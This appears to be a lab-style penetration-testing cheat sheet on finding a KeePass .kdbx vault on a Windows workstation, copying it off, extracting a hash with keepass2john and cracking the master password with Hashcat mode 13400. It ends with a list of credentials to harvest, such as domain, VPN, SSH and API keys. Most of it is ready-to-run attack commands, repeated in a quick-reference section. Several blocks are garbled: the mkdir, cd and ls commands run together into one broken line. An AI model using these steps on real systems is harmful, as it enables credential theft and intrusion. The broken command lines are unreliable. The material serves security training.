# KeePass Database Cracking

## Overview

Password managers securely store credentials inside an encrypted vault protected by a master password. During an assessment, if we gain access to a workstation using a password manager, the local database file may be recoverable and crackable offline.

KeePass stores vaults as `.kdbx` files. If we can obtain the `.kdbx` database, we can convert it into a crackable hash format using `keepass2john`, then attack the master password with Hashcat.

## Scenario

Assume access to a Windows workstation where KeePass is installed.

Example target:

```
Host: 192.168.50.203
User: jason
Password: lab
Password Manager: KeePass
```

## Enumerating Installed Password Managers

From GUI access, check installed applications:

```
Windows Start Menu → Add or remove programs
```

Look for:

```
KeePass
1Password
Bitwarden
LastPass
Dashlane
NordPass
```

## Locate KeePass Database Files

KeePass databases usually use the `.kdbx` extension.

From PowerShell:

```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Example result:

```
Directory: C:\Users\jason\DocumentsMode                 LastWriteTime         Length Name----                 -------------         ------ -----a----         5/30/2022   8:19 AM           1982 Database.kdbx
```

## Transfer the Database

Transfer the `.kdbx` file back to Kali using an available file transfer method.

Example target file:

```
C:\Users\jason\Documents\Database.kdbx
```

On Kali, place it in a working directory:

```
mkdir -p ~/passwordattacks/keepasscd ~/passwordattacks/keepassls -la Database.kdbx
```

## Convert KeePass Database to Hash

Use `keepass2john` to extract a crackable hash:

```
keepass2john Database.kdbx > keepass.hash
```

View the hash:

```
cat keepass.hash
```

Example output:

```
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*...
```

## Clean Hashcat Format

`keepass2john` prepends the database filename before the hash:

```
Database:$keepass$...
```

For Hashcat, remove the filename prefix:

```
sed -i 's/^.*://g' keepass.hash
```

Confirm the hash now starts with `$keepass$`:

```
cat keepass.hash
```

Expected format:

```
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*...
```

## Identify Hashcat Mode

Search Hashcat modes for KeePass:

```
hashcat --help | grep -i keepass
```

Expected result:

```
13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) | Password Manager
```

Hashcat mode:

```
13400
```

## Crack KeePass Master Password

Use Hashcat with `rockyou.txt`:

```
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
```

Use a rule for better coverage:

```
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
```

Example cracked result:

```
$keepass$*2*60*0*d74e29a7...:qwertyuiop123!
```

Show cracked password again:

```
hashcat -m 13400 keepass.hash --show
```

## Open KeePass Database

Once the master password is cracked:

```
Open KeePass → Open Database.kdbx → Enter cracked master password
```

Then review stored entries for:

```
Domain credentialsVPN credentialsSSH credentialsDatabase passwordsCloud accountsAdmin portalsInternal web appsAPI keysRecovery codes
```

## Quick Commands

### Find KeePass Databases on Windows

```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

### Convert Database to Hash

```
keepass2john Database.kdbx > keepass.hash
```

### Remove Filename Prefix

```
sed -i 's/^.*://g' keepass.hash
```

### Identify Hashcat Mode

```
hashcat --help | grep -i keepass
```

### Crack with Rockyou

```
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
```

### Crack with Rockyou + Rule

```
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
```

### Show Cracked Password

```
hashcat -m 13400 keepass.hash --show
```

## Notes

- KeePass database files use the `.kdbx` extension.
- The `.kdbx` file can be cracked offline if obtained.
- KeePass uses a master password, so there is no associated username.
- Remove the `Database:` prefix before using the hash with Hashcat.
- Hashcat mode for KeePass is `13400`.
- Cracking success depends entirely on master password strength.
- Always inspect vault entries for reusable credentials, admin accounts, VPN access, SSH keys, and internal application passwords.

## Tags

#password-attacks #keepass #hashcat #john #keepass2john #password-manager #credential-attacks #offline-cracking